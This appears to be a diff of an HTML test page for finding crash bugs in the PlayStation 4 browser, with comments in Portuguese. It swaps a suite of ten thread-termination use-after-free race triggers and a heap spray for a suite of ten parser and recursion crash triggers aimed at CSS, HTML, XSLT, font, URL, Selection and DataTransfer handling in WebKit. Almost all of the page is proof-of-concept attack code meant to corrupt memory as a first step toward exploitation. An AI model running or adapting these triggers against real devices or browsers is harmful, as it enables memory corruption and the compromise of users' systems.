@@ -2,240 +2,253 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 Thread UAF Suite v23000</title>
+<title>PS4 Parser Logic Suite v24000</title>
 </head>
 <body>
 
-<h1>SUITE V23000: THREAD LIFECYCLE UAF</h1>
-<p>Focus: Race Conditions on Thread Termination (Not Exhaustion)</p>
+<h1>SUITE V24000: PARSER LOGIC & RECURSION</h1>
+<p>Target: WebCore Parsers (CSS, HTML, XML, Font) & Stack Limits.</p>
 <hr>
 
-<button onclick="crashWorkerTerminateRace()">01. Worker.terminate() vs postMessage() Race (UAF)</button>
+<button onclick="crashCSSVars()">01. CSS Variables Cyclic Dependency Stack Overflow</button>
 
-<button onclick="crashPortEntangle()">02. MessagePort Transfer to Terminated Worker</button>
+<button onclick="crashHTMLParser()">02. HTML Parser Deep Nesting (Table/Ruby) Crash</button>
 
-<button onclick="crashNestedGhost()">03. Nested Worker Destruction Race</button>
+<button onclick="crashXSLT()">03. XSLTProcessor Transformation Memory Corruption</button>
 
-<button onclick="crashBlobStorm()">04. Worker Script Loading vs Blob Revocation</button>
+<button onclick="crashFontBuffer()">04. FontFace Malformed WOFF Data Parsing</button>
 
-<button onclick="crashProtoThread()">05. Object Prototype Poisoning across Threads</button>
+<button onclick="crashURLScheme()">05. URL Parser Scheme/Authority Buffer Overflow</button>
 
-<button onclick="crashEventListenerUAF()">06. Worker 'error' Event Listener UAF</button>
+<button onclick="crashCanvasFilter()">06. Canvas 2D Context 'filter' Property Parsing Crash</button>
 
-<button onclick="crashFloatDetach()">07. Float32Array Transfer Race (No SharedArrayBuffer)</button>
+<button onclick="crashDOMMatrix()">07. DOMMatrix Determinant Infinity/NaN Logic Error</button>
 
-<button onclick="crashBitmapRace()">08. ImageBitmap Transfer to Dying Worker</button>
+<button onclick="crashSelectionCollapse()">08. Selection.collapse() on Removed Node UAF</button>
 
-<button onclick="crashRecursiveTransfer()">09. Deeply Nested Object Transfer Recursion</button>
+<button onclick="crashErrorStack()">09. Error.stack Serialization Recursive Overflow</button>
 
-<button onclick="crashSpray()">10. Heap Spray (Prepare Memory for UAF)</button>
+<button onclick="crashDataTransfer()">10. DataTransferItemList Add/Remove Race</button>
 
 <div id="log" style="border: 1px solid #000; height: 300px; overflow: auto; white-space: pre-wrap; font-family: monospace;"></div>
 
 <script>
     function log(msg) {
-        document.getElementById('log').innerText += "\n[LOG] " + msg;
+        document.getElementById('log').innerText += "\n[PARSER] " + msg;
     }
 
-    // 01. Worker Terminate Race
-    // ALVO: Tentar usar a estrutura da thread (struct thread) no kernel logo após chamar terminate().
-    // Se o kernel liberar a memória da thread mas uma mensagem ainda estiver na fila...
-    function crashWorkerTerminateRace() {
-        const blob = new Blob(["onmessage=function(e){ postMessage(e.data); }"], {type:'text/javascript'});
-        const url = URL.createObjectURL(blob);
+    // 01. CSS Custom Property Recursion
+    // ALVO: CSS Parser / Style Resolver.
+    // Variáveis CSS (--var) podem referenciar outras. Um ciclo (A->B->A) deve ser detectado.
+    // Se a detecção falhar ou usar muita stack, o renderizador crasha.
+    function crashCSSVars() {
+        const div = document.createElement('div');
+        div.style.setProperty('--a', 'var(--b)');
+        div.style.setProperty('--b', 'var(--a)');
         
-        const w = new Worker(url);
-        const ab = new ArrayBuffer(1024); // Payload
-        
-        // Envia mensagem
-        w.postMessage(ab);
-        
-        // RACE: Termina o worker imediatamente.
-        // O Kernel começa a destruir a thread.
-        w.terminate();
-        
-        // Tenta enviar outra mensagem para a thread "zumbi"
-        // Se a validação de handle falhar, pode escrever em memória livre.
-        try {
-            for(let i=0; i<1000; i++) w.postMessage(ab);
-        } catch(e) {}
-    }
-
-    // 02. MessagePort Transfer to Terminated Worker
-    // ALVO: IPC (Inter-Process Communication).
-    // Transferir uma porta (Recurso Kernel) para um processo que não existe mais.
-    function crashPortEntangle() {
-        const ch = new MessageChannel();
-        const blob = new Blob(["onmessage=()=>{}"], {type:'text/javascript'});
-        const w = new Worker(URL.createObjectURL(blob));
-        
-        w.terminate(); // Mata o destino
-        
-        // Pequeno delay para garantir que o estado de morte iniciou
-        setTimeout(() => {
-            try {
-                // Tenta transferir a porta para o worker morto
-                // O Kernel tenta anexar a porta ao processo ID do worker. Se o ID sumiu ou foi reutilizado...
-                w.postMessage("ghost", [ch.port2]);
-            } catch(e) {}
-        }, 1);
-    }
-
-    // 03. Nested Worker Destruction Race
-    // ALVO: Hierarquia de Processos.
-    // Matar o pai enquanto o filho ainda está inicializando.
-    function crashNestedGhost() {
-        const childCode = "setInterval(()=>{}, 100)";
-        const childBlob = new Blob([childCode], {type:'text/javascript'});
-        const childUrl = URL.createObjectURL(childBlob);
-        
-        const parentCode = `
-            const w = new Worker("${childUrl}");
-            postMessage("spawned");
-        `;
-        const parentBlob = new Blob([parentCode], {type:'text/javascript'});
-        const parentUrl = URL.createObjectURL(parentBlob);
-        
-        const parent = new Worker(parentUrl);
-        
-        parent.onmessage = () => {
-            // Assim que o filho nasce, matamos o pai.
-            // O filho fica órfão? O Kernel limpa recursivamente?
-            parent.terminate();
-            
-            // Tenta forçar GC
-            const junk = new Array(10000).fill(1);
-        };
-    }
-
-    // 04. Worker Script Loading vs Blob Revocation
-    // ALVO: Race condition no carregamento de script (VFS).
-    function crashBlobStorm() {
-        const blob = new Blob(["console.log('race')"], {type:'text/javascript'});
-        const url = URL.createObjectURL(blob);
-        
-        // Inicia carregamento
-        const w = new Worker(url);
-        
-        // Revoga URL imediatamente
-        // O WebKit tenta ler o script, mas o Kernel deletou o handle do arquivo virtual.
-        URL.revokeObjectURL(url);
-        
-        // Tenta reiniciar worker com url inválida
-        try {
-            w.terminate();
-            new Worker(url);
-        } catch(e) {}
-    }
-
-    // 05. Object Prototype Poisoning across Threads
-    // ALVO: JSC Object Internals.
-    // Workers compartilham estruturas de código (CodeBlocks) mas não heap.
-    // Tentar confundir a estrutura de objetos transferidos.
-    function crashProtoThread() {
-        const w = new Worker(URL.createObjectURL(new Blob([`
-            onmessage = function(e) {
-                const obj = e.data;
-                // Tenta ler propriedade que pode ter sido otimizada fora
-                const val = obj.id;
-            }
-        `], {type:'text/javascript'})));
-        
-        const obj = { id: 1 };
-        // Polui o protótipo na main thread
-        Object.defineProperty(Object.prototype, 'id', {
-            get: () => { return 0x41414141; }
-        });
-        
-        w.postMessage(obj);
-    }
-
-    // 06. Worker 'error' Event Listener UAF
-    // ALVO: EventDispatcher C++.
-    function crashEventListenerUAF() {
-        const w = new Worker(URL.createObjectURL(new Blob(["throw 'crash'"], {type:'text/javascript'})));
-        
-        function handler() {
-            // Quando o erro ocorre, matamos o worker e removemos o listener
-            w.terminate();
-            w.removeEventListener('error', handler);
-            
-            // Alocação para preencher o vazio
-            const arr = new Uint32Array(1024);
-            arr.fill(0x1337);
-        }
-        
-        w.addEventListener('error', handler);
-    }
-
-    // 07. Float32Array Transfer Race (No SAB)
-    // ALVO: ArrayBuffer Neutering.
-    function crashFloatDetach() {
-        const ab = new ArrayBuffer(1024 * 1024);
-        const f32 = new Float32Array(ab);
-        
-        const w = new Worker(URL.createObjectURL(new Blob(["onmessage=()=>{}"], {type:'text/javascript'})));
-        
-        // Agenda transfer
-        setTimeout(() => w.postMessage(ab, [ab]), 0);
-        
-        // Loop de leitura na Main Thread
-        // Espera-se que o buffer suma debaixo dos pés do JS
-        const start = Date.now();
-        while(Date.now() - start < 200) {
-            if (f32.length > 0) {
-                f32[0] = 1.1;
-            }
-        }
-    }
-
-    // 08. ImageBitmap Transfer to Dying Worker
-    // ALVO: Graphics Resource Management.
-    // Bitmaps são recursos de GPU/Memória. Transferir para thread morta pode vazar o recurso.
-    function crashBitmapRace() {
-        const c = document.createElement('canvas');
-        c.width = 100; c.height = 100;
-        
-        createImageBitmap(c).then(bmp => {
-            const w = new Worker(URL.createObjectURL(new Blob([""], {type:'text/javascript'})));
-            w.terminate();
-            
-            // Transferir Bitmap para worker fechado
-            try {
-                w.postMessage(bmp, [bmp]);
-            } catch(e) {}
-        });
-    }
-
-    // 09. Deeply Nested Object Transfer Recursion
-    // ALVO: Stack Overflow no Serializador de Mensagens (Structured Clone).
-    function crashRecursiveTransfer() {
-        let obj = { a: 1 };
-        // Cria profundidade para estourar a stack de serialização do Worker
-        for(let i=0; i<5000; i++) {
-            obj = { next: obj };
-        }
-        
-        const w = new Worker(URL.createObjectURL(new Blob([""], {type:'text/javascript'})));
-        try {
-            w.postMessage(obj);
-        } catch(e) {}
-    }
-
-    // 10. Heap Spray (Prepare Memory)
-    // ALVO: Preparar o terreno. Preenche a memória com padrões conhecidos.
-    function crashSpray() {
-        const spray = [];
-        const pattern = 0x41414141; // AAAA
+        // Adiciona complexidade extra com calc()
         for(let i=0; i<1000; i++) {
-            const ab = new ArrayBuffer(1024 * 64); // 64KB
-            const view = new Uint32Array(ab);
-            view.fill(pattern);
-            spray.push(ab);
+            const child = document.createElement('div');
+            // Aninhamento forçado
+            child.style.setProperty(`--v${i}`, `calc(var(--a) + ${i}px)`);
+            div.appendChild(child);
         }
-        log("Heap Sprayed.");
+        
+        document.body.appendChild(div);
+        
+        // Força cálculo de estilo
+        try {
+            getComputedStyle(div).getPropertyValue('--a');
+        } catch(e) {}
     }
 
+    // 02. HTML Parser Deep Nesting (Table/Ruby) Crash
+    // ALVO: HTMLTreeBuilder.
+    // Certas tags HTML têm regras de parsing complexas (tabelas, ruby annotations).
+    // Aninhar milhares delas pode estourar a stack de parsing C++.
+    function crashHTMLParser() {
+        let html = "";
+        // Cria estrutura: <table><tr><td><table><tr><td>...
+        for(let i=0; i<5000; i++) {
+            html += "<table><tr><td>";
+        }
+        // Fecha
+        for(let i=0; i<5000; i++) {
+            html += "</td></tr></table>";
+        }
+        
+        const div = document.createElement('div');
+        // O crash ocorre durante o innerHTML setter
+        div.innerHTML = html;
+    }
+
+    // 03. XSLTProcessor Transformation Memory Corruption
+    // ALVO: LibXSLT (Biblioteca XML).
+    // O PS4 suporta transformação XML via XSLT. É um vetor clássico de bugs.
+    function crashXSLT() {
+        if(!window.XSLTProcessor) return log("XSLT not supported");
+        
+        const xslt = `
+        <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+            <xsl:template match="/">
+                <xsl:for-each select="//node()">
+                    <xsl:copy-of select="."/>
+                </xsl:for-each>
+            </xsl:template>
+        </xsl:stylesheet>`;
+        
+        const xml = `<root>${"<a/>".repeat(5000)}</root>`;
+        
+        const parser = new DOMParser();
+        const xsltDoc = parser.parseFromString(xslt, "text/xml");
+        const xmlDoc = parser.parseFromString(xml, "text/xml");
+        
+        const proc = new XSLTProcessor();
+        proc.importStylesheet(xsltDoc);
+        
+        try {
+            // Transformação pesada
+            proc.transformToFragment(xmlDoc, document);
+        } catch(e) {}
+    }
+
+    // 04. FontFace Malformed WOFF Data Parsing
+    // ALVO: Font Engine (FreeType ou proprietário).
+    // Passar dados binários lixo como se fossem uma fonte WOFF.
+    function crashFontBuffer() {
+        // Header WOFF falso + lixo aleatório
+        const header = new Uint8Array([0x77, 0x4F, 0x46, 0x46, 0x00, 0x01, 0x00, 0x00]); // "WOFF"
+        const junk = new Uint8Array(1024 * 50).fill(0x41);
+        const blob = new Blob([header, junk], {type: 'font/woff'});
+        const url = URL.createObjectURL(blob);
+        
+        const f = new FontFace("CrashFont", `url(${url})`);
+        f.load().catch(e => log("Font parse error (Safe)"));
+        document.fonts.add(f);
+    }
+
+    // 05. URL Parser Scheme/Authority Buffer Overflow
+    // ALVO: WebKit URL Parser.
+    // Protocolos longos ou user:pass gigantes podem estourar buffers na stack.
+    function crashURLScheme() {
+        try {
+            // Esquema gigante (protocolo)
+            const scheme = "a".repeat(10000);
+            const url = new URL(`${scheme}://example.com`);
+            
+            // Ou User:Pass gigante
+            const auth = "u".repeat(5000) + ":" + "p".repeat(5000);
+            const url2 = new URL(`http://${auth}@example.com`);
+        } catch(e) {}
+    }
+
+    // 06. Canvas 2D Context 'filter' Property Parsing Crash
+    // ALVO: CSS Parser para Canvas.
+    // A propriedade 'filter' aceita strings complexas (blur, drop-shadow).
+    function crashCanvasFilter() {
+        const c = document.createElement('canvas');
+        const ctx = c.getContext('2d');
+        
+        // Cria string de filtro recursiva/massiva
+        let f = "";
+        for(let i=0; i<2000; i++) {
+            f += `drop-shadow(0 0 ${i}px red) `;
+        }
+        
+        try {
+            ctx.filter = f;
+            // Força o parse desenhando
+            ctx.fillRect(0,0,10,10);
+        } catch(e) {}
+    }
+
+    // 07. DOMMatrix Determinant Infinity/NaN Logic Error
+    // ALVO: Biblioteca Math/Geometry.
+    // Inverter matrizes singulares ou com valores infinitos pode causar divisão por zero ou corrupção.
+    function crashDOMMatrix() {
+        if(!window.DOMMatrix) return;
+        
+        const m = new DOMMatrix();
+        m.a = 1; m.b = 0;
+        m.c = 0; m.d = 0; // Matriz singular (não inversível)
+        m.e = Infinity;   // Valor tóxico
+        m.f = NaN;
+        
+        try {
+            // Tenta inverter. O motor deve lidar com a exceção, se não... crash.
+            m.inverse();
+            // Multiplicação massiva
+            for(let i=0; i<1000; i++) m.multiplySelf(m);
+        } catch(e) {}
+    }
+
+    // 08. Selection.collapse() on Removed Node UAF
+    // ALVO: Selection API C++.
+    function crashSelectionCollapse() {
+        const sel = window.getSelection();
+        const p = document.createElement('p');
+        p.textContent = "text";
+        document.body.appendChild(p);
+        
+        // Seleciona o nó
+        const range = document.createRange();
+        range.selectNode(p);
+        sel.addRange(range);
+        
+        // Remove o nó do DOM
+        p.remove();
+        
+        // Tenta colapsar a seleção para dentro do nó removido
+        // O objeto Selection ainda pode ter referência interna ao nó 'p' morto
+        try {
+            sel.collapse(p, 0);
+        } catch(e) {}
+    }
+
+    // 09. Error.stack Serialization Recursive Overflow
+    // ALVO: JS Error Reporting / Stack Walker.
+    function crashErrorStack() {
+        const err = new Error("Crash");
+        
+        // Sobrescreve 'name' e 'message' com objetos que causam recursão ao serem convertidos para string
+        const evil = {
+            toString: () => {
+                // Gera nova pilha de chamadas durante a serialização da pilha antiga
+                new Error("Nested").stack;
+                return "Evil";
+            }
+        };
+        
+        err.name = evil;
+        err.message = evil;
+        
+        try {
+            // Acesso à propriedade .stack dispara o formatador C++
+            const s = err.stack;
+        } catch(e) {}
+    }
+
+    // 10. DataTransferItemList Add/Remove Race
+    // ALVO: Drag and Drop API.
+    // Esta API é complexa e envolve estruturas de dados do sistema operacional.
+    function crashDataTransfer() {
+        try {
+            const dt = new DataTransfer();
+            
+            // Adiciona arquivo virtual
+            const f = new File(["content"], "test.txt");
+            dt.items.add(f);
+            
+            // Loop de remove/add rápido para confundir a lista interna
+            for(let i=0; i<1000; i++) {
+                dt.items.remove(0);
+                dt.items.add(f);
+                // Acesso intermediário
+                const item = dt.items[0];
+                if(item) item.getAsFile();
+            }
+        } catch(e) {}
+    }
 </script>
 
 </body>
